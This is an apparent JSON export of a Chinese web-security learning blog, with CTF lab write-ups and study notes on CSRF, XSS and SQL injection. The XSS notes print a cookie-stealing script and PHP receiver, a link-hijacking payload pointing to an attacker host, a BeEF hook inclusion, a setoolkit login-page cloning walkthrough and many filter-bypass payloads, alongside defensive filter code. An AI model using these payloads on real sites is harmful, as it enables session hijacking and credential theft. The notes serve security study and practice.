{"meta":{"title":"bansxf's blog","subtitle":"Welcome to my blog","description":"Web Security","author":"bansxf","url":"https://lacc233.github.io","root":"/"},"pages":[{"title":"404 Not Found","date":"2020-05-09T12:01:13.593Z","updated":"2020-05-09T12:01:13.593Z","comments":true,"path":"404/index.html","permalink":"https://lacc233.github.io/404/","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"关于","date":"2020-05-09T11:59:05.829Z","updated":"2020-05-09T11:59:05.829Z","comments":true,"path":"about/index.html","permalink":"https://lacc233.github.io/about/","excerpt":"","text":"下面写关于自己的内容"},{"title":"archives","date":"2020-05-09T07:08:17.000Z","updated":"2020-05-09T13:39:12.954Z","comments":true,"path":"archives/index.html","permalink":"https://lacc233.github.io/archives/","excerpt":"","text":""},{"title":"所有分类","date":"2020-05-09T11:59:46.523Z","updated":"2020-05-09T11:59:46.523Z","comments":true,"path":"categories/index.html","permalink":"https://lacc233.github.io/categories/","excerpt":"","text":""},{"title":"所有标签","date":"2020-05-09T12:00:03.283Z","updated":"2020-05-09T12:00:03.283Z","comments":true,"path":"tags/index.html","permalink":"https://lacc233.github.io/tags/","excerpt":"","text":""},{"title":"我的朋友们","date":"2020-05-09T12:03:21.470Z","updated":"2020-05-09T12:03:21.470Z","comments":true,"path":"friends/index.html","permalink":"https://lacc233.github.io/friends/","excerpt":"这里写友链上方的内容。","text":"这里写友链上方的内容。 这里可以写友链页面下方的文字备注，例如自己的友链规范、示例等。"}],"posts":[{"title":"就差一把钥匙","slug":"就差一把钥匙","date":"2020-05-09T15:49:10.000Z","updated":"2020-05-09T23:33:31.845Z","comments":true,"path":"categories/WriteUp/就差一把钥匙/","link":"","permalink":"https://lacc233.github.io/categories/WriteUp/%E5%B0%B1%E5%B7%AE%E4%B8%80%E6%8A%8A%E9%92%A5%E5%8C%99/","excerpt":"合天网安实验室靶场：就差一把钥匙 难度：初级","text":"合天网安实验室靶场：就差一把钥匙 难度：初级 nmap嗅探，得到robots.txt,访问之 再访问console/ 添加x-forwarded-for: 127.0.0.1,篡改数据后send get flag!","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://lacc233.github.io/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://lacc233.github.io/tags/CTF/"},{"name":"CTF-Web","slug":"CTF-Web","permalink":"https://lacc233.github.io/tags/CTF-Web/"}]},{"title":"神奇的磁带","slug":"神奇的磁带","date":"2020-05-09T10:55:07.000Z","updated":"2020-05-09T14:44:31.658Z","comments":true,"path":"categories/WriteUp/神奇的磁带/","link":"","permalink":"https://lacc233.github.io/categories/WriteUp/%E7%A5%9E%E5%A5%87%E7%9A%84%E7%A3%81%E5%B8%A6/","excerpt":"合天网安实验室靶场：神奇的磁带 难度：初级","text":"合天网安实验室靶场：神奇的磁带 难度：初级 这是一个套娃,下面开始蛇皮~ 浏览器访问 burp抓包，cookie值base64解密 1234#解密echo cTEyMzQ1Njc4OTBwLi4= | base64 -d#加密echo q1234567890p.. | base64 提交解密后的值 告诉我们要提交磁带的英文tape 给了个txt文件地址，访问之 提交btzhy 给了个php页面，访问之 看源码，提示密码两位，生成字典，burp爆破模块，爆破之 1crunch 2 2 \"0123456789\" &gt; pwd.txt 比较响应长度，确认为66 提交，get flag!","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://lacc233.github.io/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://lacc233.github.io/tags/CTF/"},{"name":"CTF-Web","slug":"CTF-Web","permalink":"https://lacc233.github.io/tags/CTF-Web/"}]},{"title":"CSRF漏洞","slug":"CSRF漏洞","date":"2019-08-14T00:36:04.000Z","updated":"2020-05-10T10:03:28.906Z","comments":true,"path":"categories/web安全/CSRF漏洞/","link":"","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/CSRF%E6%BC%8F%E6%B4%9E/","excerpt":"CSRF（Cross-site request forery,跨站请求伪造）也被称为One Click Attack或者Session Riding ,通常缩写为CSRF或者XSRF","text":"CSRF（Cross-site request forery,跨站请求伪造）也被称为One Click Attack或者Session Riding ,通常缩写为CSRF或者XSRF csrf本质原因：重要操作的所有参数都是被被恶意攻击者猜测到的。 原理：利用目标用户的合法身份，忽悠目标用户点击链接，完成某些非法操作 典型例子：QQ空间自动转发说说 防御： 验证http referer字段 在请求地址中添加token，并验证 在http头中自定属性并验证 无防护的csrf漏洞get型csrf利用： 1&lt;img src=\"https://target.php?uname=123 passworld=123\"&gt; postcsrf利用：设置form表单提交 1&lt;input type=\"hidden\" name=\"username\" value=\"1111\"/&gt; 自动化探测burp探测特征： 重放请求，无一次性token或验证码 referer去掉后重放请求，无referer验证 去掉token后重放，后端认证机制薄弱 CSRFTester探测代理抓取链接和表单信息通过在工具中修改，再重新提交，如果测试的请求被网站服务器所接受，那么存在csrf漏洞。 步骤： 1.设置浏览器代理:127.0.0.1:8008 2.登录web应用程序，提交表单，在csrf工具中修改表单内容，查看是否更改，如更改表面存在csrf漏洞。 3.生产poc（观点验证程序）代码。 漏洞利用漏洞实质是服务器无法判断当前请求是否是合法账户的自定义请求。 使用服务器搭建csrf poc访问页面，在kali中,/var/www/html,下的index.html要被替换为工具生成的index.html（或者用一个站点的页面嵌入poc代码） ，修改一下ip,类似下面这句 1&lt;form method=\"POST\" name=\"form10\" action=\"http://127.0.0.1:80/espcms/espcms_admin/index.php?act=tExyZnjRRCSmgu2bgcaOZesWvaDlNc6yRugESP1ac3Y=\"&gt; 127.0.0.1改为目标站点地址，在合法用户登录后并点击了该链接，即可达成攻击目的。 token防御用户登录后，服务器会发给用户一个唯一的合法令牌，会随用户form表单中的value隐藏提交。 登录验证成功后，再会话session[“user_token”]中保存token。 在后台操作中，增删改表单中添加隐藏域hidden，设置value为token。 提交之后进行验证token是否正确。 防御措施 生成一个随机且不被轻易猜测的参数。 token泄露 get型token泄露：页面包含 1&lt;img src=\"\"&gt; 那么请求中的referer就会携带对应的get token. post型token泄露： 利用xss漏洞读取cookie,获取讯处在其中的token值。 referer防御referer用来告诉服务器该请求来自哪个页面。 代码编写：绕过技巧：创建一个带目标服务器的ip的目录burp自动生成poc:pro get型利用链接利用：a 1&lt;a href=\"\"&gt; iframe利用： 1&lt;iframe src=\"\" style=\"display:none\"&gt; img标签利用： 1&lt;img src=\"\"&gt; css中background利用： 1&lt;h1 style=\"background:url()\"&gt; 验证码防御并不能每部 都用验证码，并不是主要防御方法。 referer check防御主要用于防止盗链，同理也可以用于检查请求是否来自合法的源 缺陷：不是任何时候都会携带referer头，如https转http","categories":[{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"CSRF","slug":"CSRF","permalink":"https://lacc233.github.io/tags/CSRF/"}]},{"title":"xss跨站脚本攻击","slug":"xss跨站脚本攻击","date":"2019-08-04T01:19:47.000Z","updated":"2020-05-10T00:55:08.389Z","comments":true,"path":"categories/web安全/xss跨站脚本攻击/","link":"","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/","excerpt":"xss学习记录","text":"xss学习记录 介绍跨站脚本攻击（Cross Site Scripting）为了不和层叠样式表（CSS）混淆，故缩写为XSS；攻击者在web页面内插入恶意java script 代码，当用户浏览该页面时，恶意代码（js）会被执行，即达到攻击目的。 分类反射型XSS又称非持久性XSS，具有一次性。攻击者通过邮件等形式将包含xss代码的链接发送给正常用户，当用户点击时，服务器接受该用户的请求并进行处理，然后把带有xss的代码发送给用户，用户浏览器解析执行代码，触发xss漏洞。 存储型XSS又称持久型XSS，攻击脚本存储在目标服务器的数据库中，具有更强的隐蔽性。攻击者在论坛上，博客，留言板中，发帖的过程中嵌入XSS攻击代码，帖子被目标服务器存储在数据库中。当用户进行正常访问时，触发XSS代码。 DOM型XSSDOM型XSS全称Document Object Model，使用DOM动态访问更新文档的内容，结构及样式。服务器响应不会处理攻击者脚本，而是用户浏览器处理这个响应时，DOM对象就会 处理XSS代码，触发XSS漏洞。 盗取cookiecookie介绍某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密） 在http协议下，服务器或脚本可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户浏览器（客户端）上的小文本文件，它可包含有关用户的信息 目前cookie有临时的也有持续的，临时的只在浏览器上保存一段时间，超过规定时间，该cookie会被系统清除。 服务器可以利用cookie包含信息的任意性来筛选或经常性维护这些信息，以判断在http传输中的状态。 典型应用为判断注册用户是否已经登录网站；提示用户是否保存账号，保留用户信息，简化下次登录；购物车结账（在不同页面下选择的同一家的商品）信息都会写入到cookies。 反射xss盗取cookie1url?uname=&lt;script&gt;document.location='http://ip/xss_test/cookie.php?cookie='+document.cookie&lt;/script&gt; 将连接发送到用户，用户点击即触发XSS漏洞，同时可以使用URL编码迷惑用户。 cookie.php代码： 1234&lt;?php$cookie=$_GET['cookie'];file_put_contents('cookie.txt',$cookie);?&gt; cookie 接受cookie参数，写入到cookie.txt 利用cookie会话劫持burp登录界面修改cookie，成功登录 劫持会话后的操作 1.修改配置文件 2.上传webshell 篡改网页链接js代码讲解1234567&lt;script&gt;window.onload=function()&#123;var link=document.getElementsByTagName(\"a\");for(j=0;j&lt;link.length;j++)&#123; link[j].href=\"http://attacker-site.com/\";&#125;&#125;&lt;/script&gt; window.onload 当窗口加载时，执行匿名函数。使用for循环遍历所有获得的连接a标签 xss篡改链接在xss位置输入上面代码 篡改链接指向流量url刷流量，上述代码修改url 篡改链接指向恶意urlbeef 进行恶意链接生成，以及利用hook.js执行其他命令。kali中终端输入beef-xss启动beef并生成恶意链接, 开启一个服务器( service apache2 start )，将下面代码写入到代码（/var/www/index.html）当中 1&lt;script src=\"http://ip[:port]/hook.js\"&gt;&lt;/script&gt; 最后修改url至攻击者的服务器页面，点击即触发。 盗取用户信息盗取用户信息原理克隆网站登录界面，利用存储xss设置跳转代码，如果用户访问即跳转到克隆的登录页面，用户输入登录，账号密码被存储。 12345graph TDA[用户] --&gt; |访问| B[原始站点有存xss漏洞]B --&gt; |跳转| C[克隆站点]A --&gt; |输入账号密码|CC--&gt;|用户输入账号密码|D(成功获取并存储) setoolkit工具克隆网站万能的社工工具Select from the menu: 从菜单中选择: 1) Social-Engineering Attacks 社会工程学攻击 2) Penetration Testing (Fast-Track) 穿透测试(快速通道) 3) Third Party Modules 第三方模块 4) Update the Social-Engineer Toolkit 更新社交工程师工具包 5) Update SET configuration 更新集合配置 6) Help, Credits, and About 帮助，学分，等等 选中1 1) Spear-Phishing Attack Vectors 鱼叉式钓鱼攻击载体 2) Website Attack Vectors 网站攻击载体 3) Infectious Media Generator 感染介质发生器 4) Create a Payload and Listener 创建一个有效负载和侦听器 5) Mass Mailer Attack 大规模邮件攻击 6) Arduino-Based Attack Vector 基于arduino的攻击向量 7) Wireless Access Point Attack Vector 无线接入点攻击向量 8) QRCode Generator Attack Vector QRCode生成器攻击向量 9) Powershell Attack Vectors Powershell攻击向量 10) Third Party Modules 第三方模块 选中2 1) Java Applet Attack Method Java Applet攻击方法 2) Metasploit Browser Exploit Method Metasploit浏览器利用方法 3) Credential Harvester Attack Method 凭证收割机攻击方法 4) Tabnabbing Attack Method 制表攻击法 5) Web Jacking Attack Method 顶网攻击方法 6) Multi-Attack Web Method 多攻击Web方法 7) HTA Attack Method HTA攻击方法 选中3 1) Web Templates 网页模板 2) Site Cloner 现场切割 3) Custom Import 自定义导入 选中2 Enter the IP address for POST back in Harvester/Tabnabbing: (默认会使用网卡上的地址)Enter the url to clone:输入要克隆的站点url 存储xss跳转克隆网站xss payload: 1&lt;script&gt;window.location=\"http://ip/\"&lt;/script&gt; 查看盗取账号和密码在setoolkit终端中查看账号密码 没有过滤的xss实验环境介绍一个日本安全研究员制作的xss练习靶场https://xss-quiz.int21h.jp/在IE浏览器中打开 闭合文本标签利用xss打开审查工具，查看代码 stage #1 http://xss-quiz.int21h.jp/ 简单payload： 1&lt;script&gt;alert(document.domain);&lt;/script&gt; 闭合payload: 1\"&lt;/b&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; 属性中的xss配置chrome关闭xss-auditor右键Chrome快捷方式，选择属性，复制文件位置，创建快捷方式，粘贴，并在后面加上--args --disable-xss-auditor ,最后给快捷方式命名，完成。 之后就不用IE了，改用Chrome。 属性中xss发现Ctrl+f代码审查 stage #2 http://xss-quiz.int21h.jp/stage2.php?sid=106cdb0a46450efb744850a579323ac9103d907c 属性中xss闭合引入script 1\"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; 属性中xss闭合引入事件 1\" onmouseover=alert(document.domain);&gt; 选择列表中的xsshtml select 标签介绍123&lt;select&gt;&lt;option&gt;name&lt;/option&gt;&lt;/select&gt; 表单介绍html表单用于搜集不同类型的用户输入 1&lt;form action=\"?sid=...\" method=\"post\"&gt;&lt;/form&gt; burp测试 stage #3 http://xss-quiz.int21h.jp/stage-3.php?sid=d830eb35fde6abc802cb930e5ba1b2adaaf6680d 抓取，p2储存在漏洞payload: 1p2=japan&lt;script&gt;alert(document.domain);&lt;/script&gt; 选择参数中的xsshtml表单隐藏参数介绍1&lt;input type=\"hidden\" name=\"...\" value=\"...\"&gt; html中svg介绍svg：意为可缩放的矢量图形，使用xml格式定义图像可通过以下标签嵌入html文档：&lt;wmbed&gt;,&lt;object&gt;或者&lt;iframe&gt;，也可以使用&lt;svg&gt;标签嵌入 12&lt;svg/事件=\"\"&gt;&lt;svg/onload=alert(document.domain)&gt;%0a 闭合触发xss stage #4 http://xss-quiz.int21h.jp/stage_4.php?sid=9fb2ab3ae196c1fb05d9157d3d5f6c91b2b4398c payload: 1\"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; 限制输入长度的xsshtml 表单文本框介绍html表单用于搜集不同类型的用户输入；表单元素指的是不同类型的input元素、复选框、单选按钮、提交按钮等等；这里介绍text定义常规文本输入。 属性介绍： value 规定输入字段的初始值 readonly 规定输入字段为只读 disabled 规定输入字段是禁用的。被禁用的元素不可用，不可点击，不会提交。 size 规定输入字段的字符 maxlength 规定输入字段允许的最大长度 xss payload长度计算利用python len函数,如下，结果为40字符 12&gt;&gt;&gt; payload = \"&lt;script&gt;alert(document.domain);&lt;/script&gt;\"&gt;&gt;&gt; len(payload) 浏览器审查工具修改源码 stage #5 http://xss-quiz.int21h.jp/stage--5.php?sid=2d4972900f3da3e4e8dd3bb442c5e59402ede268 paylaod: 先修改maxlength 1\"&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; payload 触发xss漏洞随着安全意识的提高，script可能会被过滤 1\"&gt;&lt;svg/onload=alert(document.domaim)&gt;%0a 1111\" onmouseover=\"alert(document.domain)\" html事件中的xsshtml事件介绍在现代浏览器中内置有大量的事件处理器，监事特定的条件或用户行为，例如鼠标点击（onclick）或浏览器窗口完成加载某个图像（onload）。通过使用客户端的js,可以将某些特定的事件处理器作为属性添加给特定的标签，并可以在事件发生时执行一个或多个javascript命令或函数 xss漏洞发现 stage #6 http://xss-quiz.int21h.jp/stage-no6.php?sid=60b74c922558e644330a8769788ef25dae80d8e0 审查代码 1&lt;input type=\"text\" name=\"p1\" size=\"50\" value+\"132456\"&gt; 闭合思路分析1\"onmouseover=\"alert(document.domain) 1\"&gt;&lt;svg/onload=alert(document.domain)&gt;%0a payload触发xss漏洞1\" onclick=\"alert(document.domain) 空格分隔属性的xssxss探测 stage #7 http://xss-quiz.int21h.jp/stage07.php?sid=c702ac5f967df2831c3920c1aa3100af0b3e5aa8 触发xss1123 onmouseover=alert(document.domain) javascript伪协议的xssjavascript伪协议介绍将js 代码添加到客户端，方法是把它放置在伪协议说明符javascript:后的url中。 他声明了url的主题是任意javascript，它由javascript的解释器运行，若果javascript:url中的js代码含有多个语句，必须要用;讲这些语句分隔开 1javascript:var now = now Data();\"&lt;h1&gt;this item&lt;/h1&gt;\" + now; js 还可以只含有动作，但不返回值得js语句 1javascript:alert(\"hello world\") xss漏洞发现并触发 设置第一无二字符串提交，在响应中寻找。 stage #8 http://xss-quiz.int21h.jp/stage008.php?sid=b23793aaeaad16b5faa949a246a1316e9cf24917 1javascript:alert(document.domain) 1&lt;a href=\"javascript:alert(document.domain)\"&gt;javascript:alert(document.domain)&lt;/a&gt; utf-7 xss stage #9 http://xss-quiz.int21h.jp/stage_09.php?sid=7e3613202c0e7cc4ed129d4c60b98dbe887aa456 这里的utf-7 现在的浏览器已经移除了这种编码，危害较小 所以这里取巧： 或者 点击跳过这关 绕过过滤domain为空的xss stage #10 http://xss-quiz.int21h.jp/stage00010.php?sid=b86e436416bd0ed72ba8e07ffd237471e7bd006d domain被过滤，采取双写，编码绕过 双写： 1132456\"&gt;&lt;svg/onload=alert(document.domdomainain)&gt;%0a 这里使用base64编绕过，也可以采用其他 1132456\"&gt;&lt;script&gt;eval(atob(\"YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"));&lt;/script&gt; 绕过替换script和on事件的xss stage #11 https://xss-quiz.int21h.jp/stage11th.php?sid=53f688b9e3f5640b32d4096f5b0b5e4f193e5b4a 在伪协议中带空格仍然能执行 1132456\"&gt;&lt;a href=\"javasc ript:alert(document.domain);\"&gt;xss&lt;/a&gt; 然而，404,空格换一下在script中间插入&amp;#09;，&amp;#10;，空格等不可见字符，让正则匹配不到。 1123\"&gt;&lt;a href=\"javasc&amp;#10;ript:alert(document.domain);\"&gt;xss&lt;/a&gt; IE特性绕过xss过滤 stage #12 https://xss-quiz.int21h.jp/stage_no012.php?sid=6bd3fefa2774a7d333026335d5f24239d7ebb75b 这里过滤了&lt;,”,ie,有一特性 两个 ` 号 可闭合 “ 1`` onmouseover=alert(document.domain) css 特性绕过xss过滤 stage #13 https://xss-quiz.int21h.jp/stage13_0.php?sid=6c076a83715f2f3d68d7fa96051c8cba0d5528b2 同样是在ie中，css特性： ;background:url(&quot;javascript:alert(document.dmain);&quot;) 1background-color:salmon;background:url(\"javascript:alert(document.domain);\") css触发xsscss介绍层叠样式表是一种用来表现html或xml等文件样式的计算机语言。css不仅可以静态的修饰网页，还可以配合各种脚本语言动态的对网页各元素进行格式化。 css中执行jscss expression(css 表达式)又称Dymamic properties(动态属性)是早期微软DHTML的产物，以其可以在css中定义表达式（公式）来达到建立元素间属性之间的联系等作用，从IE5开始得到支持，后因标准、性能、安全性等问题、微软IE8 bate2标准模式开始，取消对css expression的支持。（实际应用：导航栏，返回顶部） 注释绕过关键字过滤 stage #14 https://xss-quiz.int21h.jp/stage-_-14.php?sid=eb2573e964a61b65bc4d456c9fae630ac19266c2 /**/ 1xss:expres/**/sion(if(!window.x)&#123;alert(document.domain);window.x=1;&#125;) 16进制绕过过滤触发xss符号 -&gt; 16 12&gt;&gt;&gt; import binascii&gt;&gt;&gt; print \"\\\\x\"+binascii.b2a_hex(\"&lt;\") 带上\\x,js 可识别 stage #15 https://xss-quiz.int21h.jp/stage__15.php?sid=e4954d390fd0e5d6a8dd4d1f3647e7f4095bcf2e 经检测，&lt; &gt; \\ 被过滤，&lt; 16进制为3c &gt;16进制为3e 1\\\\x3cscript\\\\x3ealert(document.domain);\\\\x3c/script\\\\x3e Ascii绕过过滤触发xss符号 -&gt; ascii 12&gt;&gt;&gt; import binascii&gt;&gt;&gt; print \"\\\\u00\" + binascii.b2a_hex(\"&lt;\") stage #16 https://xss-quiz.int21h.jp/stage00000016.php?sid=5286887e32a1526dc007701ca9e159eed22b992e 1\\\\u003cscript\\\\u003ealert(document.domain);\\\\u003c/script\\\\u003e 源源：由协议，主机名，端口名组成（例：协议://主机名:端口号/） 同源策略（SOP）：用于阻止一个非同源的页面恶意代码去访问另外一个非同源页面 ie的特殊处理1.位于可信域的互信的域名间，不受同源策略限制 2.ie在判断同源时不考虑端口 document.domain可通过document.domain读取或修改源；但有限制，修改之后的源不能通过其他脚本再次修改。 domain属性可以解决因同源安全策略带来的不同文档的属性共享问题 降域 document.domain,同源策略认为域和子域属于不同的域，如child.a.com 与 a.ocm,child2.a.com与child1.a.com,两两不同源，可设置document.domain=”a.com”,就同源了；想要设置以上任意两个页面通信 ，两个页面都必须设置document.domain=”a.com”。 cookie的httponly设置消除cookie：Internet选项，常规 cookie httponlysetcookie(“abc”,”test”,NULL,NULL,NULL,NULL,TRUE);设置secure参数为true之后，就不能使用js获取cookie setcookie(name(必须。规定名称),value(必须，规定值),expire(有效期),path(服务器路径),domain( 域名),secure(是否通过安全的https连接来传输cookie),httponly) 在本地实验： tescookie.php 12345678&lt;?php setcookie(\"user\",\"admin\",NULL,NULL,NULL,NULL,FALSE); setcookie(\"pass\",\"admin\",NULL,NULL,NULL,NULL,TRUE); $id = $_GET[\"id\"]; echo $id;?&gt; 1http:&#x2F;&#x2F;127.0.0.1&#x2F;testcookie.php?id&#x3D;%3Cscript%3Edocument.write(document.cookie);%3C&#x2F;script%3E 就会输出 user=admin，TRUE的pass就不会输出。 xss-filter 过滤器防御函数htmlspecialchars()函数 把预定义的字符转换为html实体 1htmlspecialchars(string,flags,character-set,double_encode) htmlentities()函数 过滤用户输入的数据，将一些特殊字符串转换为html实体。 1htmlentities(string,flags,character-set,double_encode) strip_tags()函数 剥去字符串中得html、xml以及php的标签。 该函数会剥离html注释，这点无法通过allow参数改变。 该函数是二进制安全的。 1strip_tags(string,allow) 自定义xss filter 法一 12345678910111213141516171819202122232425function xss_clean($data)&#123; // Fix &amp;entity＼n; $data=str_replace(array('&amp;','&lt;','&gt;'),array('&amp;amp;','&amp;lt;','&amp;gt;'),$data); $data=preg_replace('/(&amp;#*＼w+)[＼x00-＼x20]+;/u','$1;',$data); $data=preg_replace('/(&amp;#x*[0-9A-F]+);*/iu','$1;',$data); $data=html_entity_decode($data,ENT_COMPAT,'UTF-8'); // Remove any attribute starting with \"on\" or xmlns $data=preg_replace('#(&lt;[^&gt;]+?[＼x00-＼x20\"＼'])(?:on|xmlns)[^&gt;]*+&gt;#iu','$1&gt;',$data); // Remove javascript: and vbscript: protocols $data=preg_replace('#([a-z]*)[＼x00-＼x20]*=[＼x00-＼x20]*([`＼'\"]*)[＼x00-＼x20]*j[＼x00-＼x20]*a[＼x00-＼x20]*v[＼x00-＼x20]*a[＼x00-＼x20]*s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:#iu','$1=$2nojavascript...',$data); $data=preg_replace('#([a-z]*)[＼x00-＼x20]*=([＼'\"]*)[＼x00-＼x20]*v[＼x00-＼x20]*b[＼x00-＼x20]*s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:#iu','$1=$2novbscript...',$data); $data=preg_replace('#([a-z]*)[＼x00-＼x20]*=([＼'\"]*)[＼x00-＼x20]*-moz-binding[＼x00-＼x20]*:#u','$1=$2nomozbinding...',$data); // Only works in IE: &lt;span style=\"width: expression(alert('Ping!'));\"&gt;&lt;/span&gt; $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'\"]*.*?expression[＼x00-＼x20]*＼([^&gt;]*+&gt;#i','$1&gt;',$data); $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'\"]*.*?behaviour[＼x00-＼x20]*＼([^&gt;]*+&gt;#i','$1&gt;',$data); $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'\"]*.*?s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:*[^&gt;]*+&gt;#iu','$1&gt;',$data); // Remove namespaced elements (we do not need them) $data=preg_replace('#&lt;/*＼w+:＼w[^&gt;]*+&gt;#i','',$data); do&#123;// Remove really unwanted tags $old_data=$data; $data=preg_replace('#&lt;/*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^&gt;]*+&gt;#i','',$data); &#125;while($old_data!==$data); // we are done... return $data;&#125; 法二 12345678910111213141516171819202122232425262728293031323334&lt;?php//php防注入和XSS攻击通用过滤.//by qq:831937$_GET &amp;&amp; SafeFilter($_GET);$_POST &amp;&amp; SafeFilter($_POST);$_COOKIE &amp;&amp; SafeFilter($_COOKIE);functionSafeFilter (&amp;$arr)&#123; $ra=Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/','/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/','/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/','/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/','/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if(is_array($arr)) &#123; foreach($arras$key =&gt; $value) &#123; if(!is_array($value)) &#123; if(!get_magic_quotes_gpc()) //不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。 &#123; $value = addslashes($value); //给单引号（'）、双引号（\"）、反斜线（\\）与 NUL（NULL 字符）加上反斜线转义 &#125; $value = preg_replace($ra,'',$value); //删除非打印字符，粗暴式过滤xss可疑字符串 $arr[$key] = htmlentities(strip_tags($value));//去除 HTML 和 PHP 标记并转换为 HTML 实体 &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125;&#125;?&gt; 编码转义url编码将不安全的字符编码为安全字符在进行传输（通用得安全字母表） %+两个表示字符ascii的16进制数 html编码一些保留字符出现在文本节点和标签值里不安全，如“&lt;&gt;”会导致刘安琪误以为标签 实体编码 一般&amp;开头，“;”结尾，可不加“；”。如”&lt;”转为”&lt;” 进制编码 以&amp;#开头，加上字符的数值，”;”结尾可不加。字符数值可以是任意十进制ASCII码或Unicode字符编码，十六进制的数值需要在编码数字前加”x“ . js编码\\u +00 + ASCII码 \\x + ASCII码 jsfuck 编码含义攻击绕过 xss过滤器绕过xss payload测试 kali路径：/usr/share/wordlists/wfuzz/Injections/xss.txt 自动化探测，burp:Intruder模块，在positions设置注入位置；在payload中设置payload type为runtime file然后选择对应的xss payload，之后start attack。 关注最新的html等内容 例如更新了新标签，可进行xss测试 参考 ：owasp.org xss发生的位置get型url中的xss如果url修改提交的参数值,在页面显示，很有可能存在(反射)xss post表单中的xss在表单中的提交修改的参数值，在页面中显示，很有可能存在xss form data json中的xssjson(javascript object notation)是一种轻量级的数据交换格式，易于人阅读和编写，同时也易于机器解析和生成，并有效的提升网络传输效率 json 最常见的格式是对象的键值对 闭合前面+;alert(“xss”);//注释后面 自定义http头中的xss如果在http自定义头中提交的参数值，在页面中显示。很有可能存在xss 存储型xss灰盒测试环境搭建PHPstuday:搭建微程序，rocboss 定向xss挖掘:探测漏洞位置，能存储的地方 黑名单审计：查看filter，绕过黑名单 绕过过滤，触发xss：绕过并针对漏洞攻击 自动挖掘工具xsser介绍：针对web应用程序自动化挖掘，利用，报告xss漏洞的框架 原理：不断拼接payload 帮助信息： xsser -h 启动方式： 图像化 xsser- gtk xsstrike stage #17 https://xss-quiz.int21h.jp/stage-No17.php?sid=4f0dacf93ef764da56fd687692abc63e1a31e095","categories":[{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://lacc233.github.io/tags/xss/"}]},{"title":"sql注入","slug":"sql注入","date":"2019-06-02T14:50:18.000Z","updated":"2020-05-10T00:11:21.146Z","comments":true,"path":"categories/web安全/sql注入/","link":"","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/","excerpt":"sql注入原理和sqli靶场","text":"sql注入原理和sqli靶场 介绍定义： 服务端的sql语句被恶意修改并成功执行的行为。 原理： 客户端向服务端发送数据，服务端未严格校验客户端发送数据（sql语言是解释型语言） 产生具体原因： 代码对sql语句的参数过滤不严格 未启用框架的安全配置，如php的gpc 未使用安全框架的查询方法，如对应开发语言的安全框架的查询接口 测试接口未删除 未启用防火墙 未启用其他安全防护设备 业务场景： 所有与数据库产生交互的地方都有可能 登录功能 搜索功能 详情页 商品购买 … 漏洞危害： 数据库信息泄露 网页篡改 网站被挂马，传播恶意软件 数据库被恶意操作 服务器被远程控制，被安装后门 不同人的看法： 研发人员：这不是bug,不要耽误我的开发进度 运维人员：研发怎么回事？ 产品经理：研发怎么回事？ 安全人员：这研发一点安全意识都没有 吃瓜群众：真香（看热闹），？？？说的啥 步骤： 判断是否有注入（是否严格校验）(1).可控参数改变能否影响页面显示(2).输入了sql语句是否能报错（报错可看到数据库的一些语句痕迹，不报错可判断我们的语句是否成功闭合） 什么类型的注入 语句能否被恶意篡改 是否能成功执行 获取数据 mysql数据库库结构：默认mysql和infomation_schema数据库infomatino_schema内的schemata表存有所有库名；tables表中的所有表名；columns表内存有所有字段名。数据库-&gt;表-&gt;字段-&gt;值 分类返回类型：get和post 数据类型：整型，字符型 其他类型：… 报错注入联合注入盲注布尔，时间（sleep,benchmark） burpsuite工具链接：https://pan.baidu.com/s/1pCEyXH5mkD2RojXk7DvXdA提取码：1mbb复制这段内容后打开百度网盘手机App，操作更方便哦 破解参考博客 burpsuite使用参考博客 get基于报错的注入Less-1:‘’1’’ LIMIT 0,1’‘1’’ LIMIT 0,1sql: select password,a from admain where id=’’ LIMIT 0,1 